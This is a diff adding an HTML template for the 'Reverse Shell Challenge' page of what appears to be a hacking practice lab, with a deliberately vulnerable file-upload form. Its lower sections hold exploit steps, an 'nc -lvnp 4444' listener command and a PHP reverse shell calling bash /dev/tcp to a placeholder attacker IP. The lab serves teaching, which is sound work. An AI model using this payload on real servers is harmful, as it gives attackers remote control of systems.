@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ULEL Reverse Shell</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/assets/style.css" />
+</head>
+<body>
+  {% if session.get('username') %}
+    <div class="top-bar">
+      <div class="user-info">
+        Logged in as: <strong>{{ session['username'] }}</strong>
+      </div>
+      <a href="{{ url_for('logout') }}" class="logout-btn">Logout</a>
+    </div>
+  {% endif %}
+  <div class="container">
+    <aside class="sidebar">
+      <h1>🛡️ ULEL-box</h1>
+      <nav>
+        <a href="{{ url_for('dashboard') }}">Dashboard</a>
+        <a href="{{ url_for('sql_injection') }}">SQL Injection</a>
+        <a href="{{ url_for('reverse_shell') }}">Reverse Shell</a>
+        <a href="{{ url_for('privilege_escalation') }}">Privilege Escalation</a>
+        <a href="{{ url_for('boxes') }}">Boxes</a>
+        <a href="{{ url_for('installations') }}">Installations</a>
+      </nav>
+    </aside>
+
+    <main class="main-content">
+      <header>
+        <h2>Reverse Shell Challenge</h2>
+      </header>
+
+
+      <section class="card fade show">
+        <h3>📜 Scenario</h3>
+        <p>
+          The company allows users to upload profile pictures. However, the file validation is broken!
+          <br><br>
+          An attacker could upload a malicious file (like a PHP reverse shell) and gain access to the server.
+        </p>
+      </section>
+
+
+      <section class="card fade show">
+        <h3>🧠 What is a Reverse Shell?</h3>
+        <p>
+          A reverse shell is when a target machine connects back to the attacker's machine, giving the attacker a command-line control.
+          <br><br>
+          Usually used after finding a vulnerability that allows code execution.
+        </p>
+      </section>
+
+
+      <section class="card fade show">
+        <h3>⚠️ Vulnerable Upload Form</h3>
+        <form class="login-form" action="/upload-shell" method="POST" enctype="multipart/form-data">
+          <label>Upload your file:</label>
+          <input type="file" name="file" id="fileInput" required />
+          <div class="form-buttons">
+            <button type="submit" class="btn green">Upload</button>
+          </div>
+        </form>
+        <div id="wrongMsg" class="wrong-msg">❌ Incorrect Reverse Shell. Try again!</div>
+        <div class="important-message" id="important-message">🔁 You’ve already completed this challenge. Try another one!</div>
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}
+            <p id="uploadResult" class="note">{{ messages[0] }}</p>
+          {% endif %}
+        {% endwith %}
+      </section>
+
+
+      <section class="card fade show">
+        <h3>🛠 How to Exploit Step-by-Step</h3>
+        <ol>
+          <li>Prepare a file named <strong>shell.php</strong> containing a reverse shell payload.</li>
+          <li>Upload it through the broken upload form.</li>
+          <li>Server executes your file ➔ You catch the shell on your listener.</li>
+        </ol>
+        <p class="note">
+          In a real attack, you would use a tool like <code>nc -lvnp 4444</code> to listen for incoming shells.
+        </p>
+      </section>
+      <section class="card fade show">
+        <h3>💻 Example Reverse Shell Code</h3>
+        <p>
+          Here's a simple PHP reverse shell you could upload:
+        </p>
+<pre><code>
+&lt;?php<br>
+// Reverse shell payload<br>
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR-IP/YOUR-PORT 0&gt;&amp;1'");<br>
+?&gt;
+</code></pre>
+        <p class="note">
+          Replace <strong>YOUR-IP</strong> with your attacker's IP address and <strong>YOUR-PORT</strong> with your listening port (e.g., 4444).
+        </p>
+      </section>
+
+    </main>
+  </div>
+
+
+  <div id="trophy" class="hidden">
+    🏆 Reverse Shell Successfully Triggered!
+  </div>
+
+  {% if success and finished == False and submitted == True %}
+    <script>
+      window.addEventListener('DOMContentLoaded', () => {
+        const wrong = document.getElementById("wrongMsg");
+        wrong.classList.remove('show');
+        showTrophy("Reverse Shell Challenge Complete!");
+      });
+    </script>
+  {% endif %}
+  {% if success == False and finished == False and submitted == True %}
+    <script>
+
+      window.addEventListener('DOMContentLoaded', () => {
+        const result = document.getElementById("wrongMsg");
+        result.classList.add("show");
+      });
+    </script>
+  {% endif %}
+  {% if finished %}
+    <script>
+      const importantMessage = document.getElementById('important-message');
+      importantMessage.style.display = 'block';
+      const wrong = document.getElementById("wrongMsg");
+      wrong.classList.remove('show');
+    </script>
+  {% endif %}
+
+
+  <script>
+
+    function showTrophy() {
+      const trophy = document.getElementById('trophy');
+      trophy.classList.remove('hidden');
+      setTimeout(() => {
+        trophy.classList.add('show');
+      }, 100);
+
+      setTimeout(() => {
+        trophy.classList.remove('show');
+        setTimeout(() => {
+          trophy.classList.add('hidden');
+        }, 500);
+      }, 2500);
+    }
+  </script>
+
+</body>
+</html>
